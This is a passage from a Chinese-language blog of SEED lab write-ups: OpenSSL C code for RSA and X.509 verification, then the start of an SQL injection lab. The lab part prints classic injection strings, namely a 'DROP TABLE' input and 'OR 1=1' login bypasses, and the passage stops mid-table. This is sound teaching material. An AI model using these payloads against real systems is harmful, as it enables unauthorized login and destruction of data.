class="hljs-comment">//对p、q、e进行赋值</span><br>    BN_hex2bn(&amp;p, <span class="hljs-string">&quot;F7E75FDC469067FFDC4E847C51F452DF&quot;</span>);<br>    BN_hex2bn(&amp;q, <span class="hljs-string">&quot;E85CED54AF57E53E092113E62F436F4F&quot;</span>);<br>    BN_hex2bn(&amp;e, <span class="hljs-string">&quot;0D88C3&quot;</span>);<br>    BN_hex2bn(&amp;one, <span class="hljs-string">&quot;1&quot;</span>);<br>    <span class="hljs-comment">//计算得出p*q=n</span><br>    BN_mul(n, p, q, ctx);<br>    <span class="hljs-comment">//phi_n=(p-1)*(q-1)</span><br>    BN_sub(p_1, p, one);<br>    BN_sub(q_1, q, one);<br>    BN_mul(phi_n,p_1, q_1, ctx);<br>    BN_mod_inverse(d, e, phi_n, ctx);<br><br>    <span class="hljs-comment">//print function</span><br>    <span class="hljs-keyword">char</span> * number_str = BN_bn2hex(n);<br>    <span class="hljs-keyword">char</span> * number_str1 = BN_bn2hex(d);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p * q =  %s\n , d = %s \n&quot;</span>, number_str,number_str1);<br>    <br>    <span class="hljs-comment">//free </span><br>    OPENSSL_free(number_str);<br>    OPENSSL_free(number_str1);<br>    <br>    BN_clear_free(p);<br>    BN_clear_free(q);<br>    BN_clear_free(e);<br>    BN_clear_free(d);<br>    BN_clear_free(n);<br>    BN_clear_free(p_1);<br>    BN_clear_free(q_1);<br>    BN_clear_free(phi_n);<br>    BN_clear_free(res);<br>    BN_clear_free(one);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="Task-2-Encrypting-a-Message"><a href="#Task-2-Encrypting-a-Message" class="headerlink" title="Task 2: Encrypting a Message"></a>Task 2: Encrypting a Message</h1><ul><li>(e, n)是公钥</li><li>加密消息”A top secret!”</li><li>ASCII转化为hex字符串，再通过BN_hex2bn() API将字符串再转化为BIGNUM</li></ul><p>python 命令将十六进制字符串转换回纯 ASCII 字符串:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python -c ’<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;4120746f702073656372657421&quot;</span>.decode(<span class="hljs-string">&quot;hex&quot;</span>))’</span><br><br>A top secret!<br></code></pre></td></tr></table></figure><p>python 命令将纯 ASCII 字符串转换回十六进制字符串:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python -c ’<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;A top secret!&quot;</span>.encode(<span class="hljs-string">&quot;hex&quot;</span>))’</span><br><br>4120746f702073656372657421<br></code></pre></td></tr></table></figure><p>给出的参数：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">n</span> = DCBFFE<span class="hljs-number">3</span>E<span class="hljs-number">51</span>F<span class="hljs-number">62</span>E<span class="hljs-number">09</span>CE<span class="hljs-number">7032</span>E<span class="hljs-number">2677</span>A<span class="hljs-number">78946</span>A<span class="hljs-number">849</span>DC<span class="hljs-number">4</span>CDDE<span class="hljs-number">3</span>A<span class="hljs-number">4</span>D<span class="hljs-number">0</span>CB<span class="hljs-number">81629242</span>FB<span class="hljs-number">1</span>A<span class="hljs-number">5</span><br><span class="hljs-attribute">e</span> = <span class="hljs-number">010001</span> (this hex value equals to decimal <span class="hljs-number">65537</span>)<br><span class="hljs-attribute">M</span> = A top secret!<br><span class="hljs-attribute">d</span> = <span class="hljs-number">74</span>D<span class="hljs-number">806</span>F<span class="hljs-number">9</span>F<span class="hljs-number">3</span>A<span class="hljs-number">62</span>BAE<span class="hljs-number">331</span>FFE<span class="hljs-number">3</span>F<span class="hljs-number">0</span>A<span class="hljs-number">68</span>AFE<span class="hljs-number">35</span>B<span class="hljs-number">3</span>D<span class="hljs-number">2</span>E<span class="hljs-number">4794148</span>AACBC<span class="hljs-number">26</span>AA<span class="hljs-number">381</span>CD<span class="hljs-number">7</span>D<span class="hljs-number">30</span>D<br></code></pre></td></tr></table></figure><p><strong>思路</strong></p><ul><li><p>  ASCII 字符串转换为十六进制字符，再转换为<code>BIGNUM</code>类型</p></li><li><p>  使用d可以验证结果正确</p></li></ul><p><strong>代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;openssl/bn.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NBITS 256</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    BN_CTX *ctx = BN_CTX_new();<br>    BIGNUM *e = BN_new();<br>    BIGNUM *d = BN_new();<br>    BIGNUM *n = BN_new();<br>    BIGNUM *M = BN_new();<br>    BIGNUM *C = BN_new();<br>    BIGNUM *res = BN_new();<br>    <br>    <span class="hljs-comment">//对p、q、e M进行赋值</span><br>    BN_hex2bn(&amp;n, <span class="hljs-string">&quot;DCBFFE3E51F62E09CE7032E2677A78946A849DC4CDDE3A4D0CB81629242FB1A5&quot;</span>);<br>    BN_hex2bn(&amp;e, <span class="hljs-string">&quot;010001&quot;</span>);<br>    BN_hex2bn(&amp;d, <span class="hljs-string">&quot;74D806F9F3A62BAE331FFE3F0A68AFE35B3D2E4794148AACBC26AA381CD7D30D&quot;</span>);<br>    BN_hex2bn(&amp;M, <span class="hljs-string">&quot;4120746f702073656372657421&quot;</span>);<br><br>    <span class="hljs-comment">//C = M^e mod n</span><br>    BN_mod_exp(C, M, e, n, ctx);<br>    BN_mod_exp(res, C, d, n, ctx);<br>    <br>    <span class="hljs-comment">//print function</span><br>    <span class="hljs-keyword">char</span> * number_str = BN_bn2hex(C);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;C = %s \n&quot;</span>, number_str);<br>    <br>    <span class="hljs-keyword">char</span> * number_str1 = BN_bn2hex(res);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;C^d = %s \n&quot;</span>, number_str1);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;      4120746f702073656372657421 == \&quot;A top secret \&quot;\n&quot;</span>);<br><br>    <span class="hljs-comment">//free </span><br>    OPENSSL_free(number_str);<br>    OPENSSL_free(number_str1);<br>    <br>    BN_clear_free(e);<br>    BN_clear_free(d);<br>    BN_clear_free(n);<br>    BN_clear_free(M);<br>    BN_clear_free(C);<br>    BN_clear_free(res);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Task-3-Decrypting-a-Message"><a href="#Task-3-Decrypting-a-Message" class="headerlink" title="Task 3: Decrypting a Message"></a>Task 3: Decrypting a Message</h1><p>使用的公钥/私钥与 Task 2中使用的公钥/私钥相同,解密以下密文 C，并将其转换回纯 ASCII 字符串</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">C</span> = <span class="hljs-number">8</span>C<span class="hljs-number">0</span>F<span class="hljs-number">971</span>DF<span class="hljs-number">2</span>F<span class="hljs-number">3672</span>B<span class="hljs-number">28811407</span>E<span class="hljs-number">2</span>DABBE<span class="hljs-number">1</span>DA<span class="hljs-number">0</span>FEBBBDFC<span class="hljs-number">7</span>DCB<span class="hljs-number">67396567</span>EA<span class="hljs-number">1</span>E<span class="hljs-number">2493</span>F<br></code></pre></td></tr></table></figure><p><strong>思路</strong></p><ul><li>  RSA运算之后使用python解码得出信息</li></ul><p><strong>代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;openssl/bn.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NBITS 256</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    BN_CTX *ctx = BN_CTX_new();<br>    BIGNUM *e = BN_new();<br>    BIGNUM *d = BN_new();<br>    BIGNUM *n = BN_new();<br>    BIGNUM *M = BN_new();<br>    BIGNUM *C = BN_new();<br>    BIGNUM *res = BN_new();<br>    <br>    <span class="hljs-comment">//对p、q、e M进行赋值</span><br>    BN_hex2bn(&amp;n, <span class="hljs-string">&quot;DCBFFE3E51F62E09CE7032E2677A78946A849DC4CDDE3A4D0CB81629242FB1A5&quot;</span>);<br>    BN_hex2bn(&amp;e, <span class="hljs-string">&quot;010001&quot;</span>);<br>    BN_hex2bn(&amp;d, <span class="hljs-string">&quot;74D806F9F3A62BAE331FFE3F0A68AFE35B3D2E4794148AACBC26AA381CD7D30D&quot;</span>);<br>    BN_hex2bn(&amp;M, <span class="hljs-string">&quot;4120746f702073656372657421&quot;</span>);<br>    BN_hex2bn(&amp;C, <span class="hljs-string">&quot;8C0F971DF2F3672B28811407E2DABBE1DA0FEBBBDFC7DCB67396567EA1E2493F&quot;</span>);<br>    <br>    <span class="hljs-comment">//M = C^d mod n</span><br>    BN_mod_exp(res, C, d, n, ctx);<br>    <br>    <span class="hljs-comment">//print function</span><br>    <span class="hljs-keyword">char</span> * number_str = BN_bn2hex(res);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;M = %s \n&quot;</span>, number_str);<br>    <br>    <span class="hljs-comment">//free </span><br>    OPENSSL_free(number_str);<br>    <br>    BN_clear_free(e);<br>    BN_clear_free(d);<br>    BN_clear_free(n);<br>    BN_clear_free(M);<br>    BN_clear_free(C);<br>    BN_clear_free(res);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Task-4-Signing-a-Message"><a href="#Task-4-Signing-a-Message" class="headerlink" title="Task 4: Signing a Message"></a>Task 4: Signing a Message</h1><p>使用的公钥/私钥与 Task 2中使用的公钥/私钥相同</p><p>字符串的hex编码是<code>49206f776520796f75202432303030</code></p><ul><li><p>  按照上述RSA法则进行编程</p></li><li><p>  M1 = I owe you $2000，对应结果为<code>80A55421D72345AC199836F60D51DC9594E2BDB4AE20C804823FB71660DE7B82 </code></p></li><li><p>  M2 = I owe you $3000，对应结果为<code> 04FC9C53ED7BBE4ED4BE2C24B0BDF7184B96290B4ED4E3959F58E94B1ECEA2EB</code></p></li><li><p>  虽然明文只是改变一个字符，但是签名结果迥然不同</p></li></ul><h1 id="Task-5-Verifying-a-Signature"><a href="#Task-5-Verifying-a-Signature" class="headerlink" title="Task 5: Verifying a Signature"></a>Task 5: Verifying a Signature</h1><p>S 是 M 的签名，Alice 的公钥是(e，n)，验证签名是否确实是爱丽丝的</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">M</span> = Launch a missile.<br><span class="hljs-attribute">S</span> = <span class="hljs-number">643</span>D<span class="hljs-number">6</span>F<span class="hljs-number">34902</span>D<span class="hljs-number">9</span>C<span class="hljs-number">7</span>EC<span class="hljs-number">90</span>CB<span class="hljs-number">0</span>B<span class="hljs-number">2</span>BCA<span class="hljs-number">36</span>C<span class="hljs-number">47</span>FA<span class="hljs-number">37165</span>C<span class="hljs-number">0005</span>CAB<span class="hljs-number">026</span>C<span class="hljs-number">0542</span>CBDB<span class="hljs-number">6802</span>F<br><span class="hljs-attribute">e</span> = <span class="hljs-number">010001</span> (this hex value equals to decimal <span class="hljs-number">65537</span>)<br><span class="hljs-attribute">n</span> = AE<span class="hljs-number">1</span>CD<span class="hljs-number">4</span>DC<span class="hljs-number">432798</span>D<span class="hljs-number">933779</span>FBD<span class="hljs-number">46</span>C<span class="hljs-number">6</span>E<span class="hljs-number">1247</span>F<span class="hljs-number">0</span>CF<span class="hljs-number">1233595113</span>AA<span class="hljs-number">51</span>B<span class="hljs-number">450</span>F<span class="hljs-number">18116115</span><br></code></pre></td></tr></table></figure><p>转码得到对应hex为<code>4c61756e63682061206d697373696c65</code></p><ul><li><p>  <strong>签名过程：私钥签名，公钥验证</strong></p></li><li><p>  与运行截图比对，$S^e$的结果与明文相同，因此签名有效</p></li></ul><h1 id="Task-6-Manually-Verifying-an-X-509-Certificate"><a href="#Task-6-Manually-Verifying-an-X-509-Certificate" class="headerlink" title="Task 6: Manually Verifying an X.509 Certificate"></a>Task 6: Manually Verifying an X.509 Certificate</h1><p>使用程序手动验证 X.509证书。X.509包含有关公钥的数据和数据上的发行者签名。我们将从 Web 服务器下载一个真正的 X.509证书，获取其发行者的公钥，然后使用这个公钥验证证书上的签名</p><p>证书生成过程：</p><ul><li>首先 CA 会把持有者的公钥、用途、颁发者、有效时间等信息打成一个包，然后对这些信息进行 Hash 计算，得到一个 Hash 值；</li><li>然后 CA 会使用自己的私钥将该 Hash 值加密，生成 Certificate Signature，也就是 CA 对证书做了签名；</li><li>最后将 Certificate Signature 添加在文件证书上，形成数字证书；</li></ul><h2 id="Step-1-Download-a-certificate-from-a-real-web-server"><a href="#Step-1-Download-a-certificate-from-a-real-web-server" class="headerlink" title="Step 1: Download a certificate from a real web server."></a>Step 1: Download a certificate from a real web server.</h2><p>显示证书</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> openssl s_client -connect www.example.org:443 -showcerts</span><br></code></pre></td></tr></table></figure><p>打印出来的”Begin CERTIFICATE” 和 “END CERTIFICATE”之间的就是证书，将其手动保存在<code>.pem</code>文件中</p><ul><li><p>如果有两个证书，第一个是网站的证书，保存为c0.pem，第二个是中间CA的证书，保存为c1.pem</p></li><li><p>如果只有一个证书，那么说明网站的证书是根 CA 签名的</p></li><li><p>使用 -modulus 选项显示 n</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">For modulus (n):<br><span class="hljs-meta">$</span><span class="bash"> openssl x509 -<span class="hljs-keyword">in</span> c1.pem -noout -modulus</span><br></code></pre></td></tr></table></figure></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Modulus=C70E6C3F23937FCC70A59D20C30E533F7EC04EC29849CA47D523EF03348574C8A3022E465C0B7DC9889D4F8BF0F89C6C8C5535DBBFF2B3EAFBE356E74A46D91322CA36D59BC1A8E3964393F20CBCE6F9E6E899C86348787F5736691A191D5AD1D47DC29CD47FE18012AE7AEA88EA57D8CA0A0A3A1249A262197A0D24F737EBB473927B05239B12B5CEEB29DFA41402B901A5D4A69C436488DEF87EFEE3F51EE5FEDCA3A8E46631D94C25E918B9895909AEE99D1C6D370F4A1E352028E2AFD4218B01C445AD6E2B63AB926B610A4D20ED73BA7CCEFE16B5DB9F80F0D68B6CD908794A4F7865DA92BCBE35F9B3C4F927804EFF9652E60220E10773E95D2BBDB2F1<br></code></pre></td></tr></table></figure><h2 id="Step-2-Extract-the-public-key-e-n-from-the-issuer’s-certificate-求出公钥-（e-n）"><a href="#Step-2-Extract-the-public-key-e-n-from-the-issuer’s-certificate-求出公钥-（e-n）" class="headerlink" title="Step 2: Extract the public key (e, n) from the issuer’s certificate. 求出公钥 （e,n）"></a>Step 2: Extract the public key (e, n) from the issuer’s certificate. 求出公钥 （e,n）</h2><h2 id="Step-3-Extract-the-signature-from-the-server’s-certificate-从服务器的证书中提取签名"><a href="#Step-3-Extract-the-signature-from-the-server’s-certificate-从服务器的证书中提取签名" class="headerlink" title="Step 3: Extract the signature from the server’s certificate.从服务器的证书中提取签名"></a>Step 3: Extract the signature from the server’s certificate.从服务器的证书中提取签名</h2><ul><li>没有特别的命令打印出 e 和 签名信息，可以打印出证书所有的信息然后在文本中查找</li><li>签名中会有空格和<code>:</code>，可以使用脚本cat signature | tr -d ’[:space:]:’除去，得到纯十六进制字符串<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-built_in">Print</span> <span class="hljs-keyword">out</span> <span class="hljs-built_in">all</span> the fields, find the <span class="hljs-built_in">exponent</span> (e) and signature:<br>$ openssl x509 -<span class="hljs-keyword">in</span> c1.pem -text -noout<br></code></pre></td></tr></table></figure></li></ul><h2 id="Step-4-提取服务器证书的正文"><a href="#Step-4-提取服务器证书的正文" class="headerlink" title="Step 4: 提取服务器证书的正文"></a>Step 4: 提取服务器证书的正文</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">$ openssl asn1parse -i -in c0.pem -strparse <span class="hljs-number">4</span> -out c0_body.bin -noout<br></code></pre></td></tr></table></figure><p>计算sha值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">$ sha256sum c0_body.bin<br></code></pre></td></tr></table></figure><h2 id="Step-5-Verify-the-signature"><a href="#Step-5-Verify-the-signature" class="headerlink" title="Step 5:Verify the signature."></a>Step 5:Verify the signature.</h2><p>可以看出两段<code>sha</code>值相等，都是<code>837D0252E9D5F45DEC8294152267D7097B387AA178549B65CD6FB2F307013E1C</code>，因此可以验证，证书有效</p><p><strong>代码</strong></p><ul><li>  求出$S^e$</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;openssl/bn.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NBITS 256</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    BN_CTX *ctx = BN_CTX_new();<br>    BIGNUM *e = BN_new();<br>    BIGNUM *n = BN_new();<br>    BIGNUM *S = BN_new();<br>    BIGNUM *res = BN_new();<br>    <span class="hljs-comment">//赋值</span><br>    BN_hex2bn(&amp;n,      <span class="hljs-string">&quot;C70E6C3F23937FCC70A59D20C30E533F7EC04EC29849CA47D523EF03348574C8A3022E465C0B7DC9889D4F8BF0F89C6C8C5535DBBFF2B3EAFBE356E74A46D91322CA36D59BC1A8E3964393F20CBCE6F9E6E899C86348787F5736691A191D5AD1D47DC29CD47FE18012AE7AEA88EA57D8CA0A0A3A1249A262197A0D24F737EBB473927B05239B12B5CEEB29DFA41402B901A5D4A69C436488DEF87EFEE3F51EE5FEDCA3A8E46631D94C25E918B9895909AEE99D1C6D370F4A1E352028E2AFD4218B01C445AD6E2B63AB926B610A4D20ED73BA7CCEFE16B5DB9F80F0D68B6CD908794A4F7865DA92BCBE35F9B3C4F927804EFF9652E60220E10773E95D2BBDB2F1&quot;</span>);<br>    BN_hex2bn(&amp;S, <span class="hljs-string">&quot;398a004992481658de3e9cce83391bb1ac9a95f956ff7c2d82d3a8365be6cf7dfd4a987248f2b7f652d40b092ca25c3347e29a9b3e97bdd8ba0009c9ae1eb3bcdee81ee1ded905f8a9b03dedb97ab2a93c934e078cf05ecc8bf375336e5582e599429f9c8154fbadce280c3842609568e14d5f832da43276d8511c1d66b79cad1f19f940e47c744ddb2abbeaf3244de9387721523cfd1e811e900084aec866fce3817891d04378992aa485313c9f6bef489e1e394d5107b7534dffe213abe3ca6d7c21f6e2fa2273f465717577da088ef72d5be601c9f7960c5f2da8d73e4c5ec29278e41b4e9b28369f1877f2bbf56a6471780fead5687f1157b4ff0fb0e473&quot;</span>);<br>    BN_hex2bn(&amp;e, <span class="hljs-string">&quot;10001&quot;</span>);<br>    <br>    <br>    BN_mod_exp(res, S, e, n, ctx);<br>     <br>    <span class="hljs-comment">//print function</span><br>    <span class="hljs-keyword">char</span> * number_str = BN_bn2hex(res);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;S^e = %s \n&quot;</span>, number_str);<br>    <br>    <span class="hljs-comment">//free </span><br>    OPENSSL_free(number_str);<br>    <br>    BN_clear_free(e);<br>    BN_clear_free(n);<br>    BN_clear_free(res);<br>    BN_clear_free(S);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-lab：SQL Injection Attack Lab</title>
    <link href="/p/961c048e/"/>
    <url>/p/961c048e/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL-注入原理"><a href="#SQL-注入原理" class="headerlink" title="SQL 注入原理"></a>SQL 注入原理</h1><p>下图可以很好的表示SQL注入，车牌被识别后，系统会执行drop database指令删除数据库</p><p><img src="https://img-blog.csdnimg.cn/img_convert/ec8ce91818ae7d3080bdeb55586a55a5.png"></p><p><strong>下面的漫画中，该学生的姓名为“Robert’); DROP TABLE students;–”，导致students表被删除：</strong></p><p><img src="https://img-blog.csdnimg.cn/img_convert/5c3cc846a007cb39ab09a6b88c7526ba.png"></p><p>在输入的字符串之中注入SQL指令，恶意指令就会被数据库服务器误认为是正常的SQL指令而运行，遭到破坏或是入侵</p><p>例如，某个网站的登录验证的SQL查询代码为</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">strSQL = <span class="hljs-string">&quot;SELECT * FROM users WHERE (name = &#x27;&quot;</span> + userName + <span class="hljs-string">&quot;&#x27;) and (pw = &#x27;&quot;</span>+ passWord +<span class="hljs-string">&quot;&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p>恶意填入</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">userName = <span class="hljs-string">&quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span>;<br></code></pre></td></tr></table></figure><p>与</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">passWord = <span class="hljs-string">&quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span>;<br></code></pre></td></tr></table></figure><p>时，将导致原本的SQL字符串被填为</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">strSQL = <span class="hljs-string">&quot;SELECT * FROM users WHERE (name = &#x27;1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;) and (pw = &#x27;1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p>实际上运行的SQL命令会变成下面这样的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">strSQL = <span class="hljs-string">&quot;SELECT * FROM users;&quot;</span><br></code></pre></td></tr></table></figure><p>从而达到无账号密码登录网站。所以SQL注入被俗称为<strong>黑客的填空游戏。</strong></p><h2 id="SQL-Injection中的特殊字符：单引号-39-39-与井号"><a href="#SQL-Injection中的特殊字符：单引号-39-39-与井号" class="headerlink" title="SQL Injection中的特殊字符：单引号&#39;&#39;与井号#"></a>SQL Injection中的特殊字符：单引号<code>&#39;&#39;</code>与井号<code>#</code></h2><p>输入数据两端都会被加上引号<code>&#39;&#39;</code>作为SQL语句的一部分</p><p>比如，下面是一个输入窗口：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/44fb127eee93184340f3ad7cc69800ad.png"></p><p>实际上它的形式：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f321fe94d6da7e76b09bd1fa44299434.png"></p><p>假若输入数据分别为：<code>EID5002&#39;  #&#39;</code>   和  <code>xyz</code></p><p>则对应的SQL语句为：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5fdd2ba79ece2a43aeaf8023f852a8bd.png" alt="image-20210323081645971"></p><p>可以看到<code>#</code>后的内容被注释</p><p>因此，通过人为的输入<code>&#39;&#39;</code>和<code>#</code>，可以改变SQL语句的意义</p><h1 id="lab-setup"><a href="#lab-setup" class="headerlink" title="lab setup"></a>lab setup</h1><ul><li>下载实验文件，解压</li><li>增加hosts映射</li><li>运行docker</li></ul><h1 id="Task-1-Get-Familiar-with-SQL-Statements"><a href="#Task-1-Get-Familiar-with-SQL-Statements" class="headerlink" title="Task 1: Get Familiar with SQL Statements"></a>Task 1: Get Familiar with SQL Statements</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">docksh &lt;id&gt; #进入MySQL容器内部<br><br>mysql -u root -pdees # root身份进入数据库<br><br>use sqllab_users;#使用已创建的sqllab_users数据库<br><br>show tables;#显示table<br><br>select * from credential; # 打印出credential表全部信息<br><br>+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+<br>| ID | Name  | EID   | Salary | birth | SSN      | PhoneNumber | Address | Email | NickName | Password                                 |<br>+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+<br>|  1 | Alice | 10000 |  20000 | 9/20  | 10211002 |             |         |       |          | fdbe918bdae83000aa54747fc95fe0470fff4976 |<br>|  2 | Boby  | 20000 |  30000 | 4/20  | 10213352 |             |         |       |          | b78ed97677c161c1c82c142906674ad15242b2d4 |<br>|  3 | Ryan  | 30000 |  50000 | 4/10  | 98993524 |             |         |       |          | a3c50276cb120637cca669eb38fb9928b017e9ef |<br>|  4 | Samy  | 40000 |  90000 | 1/11  | 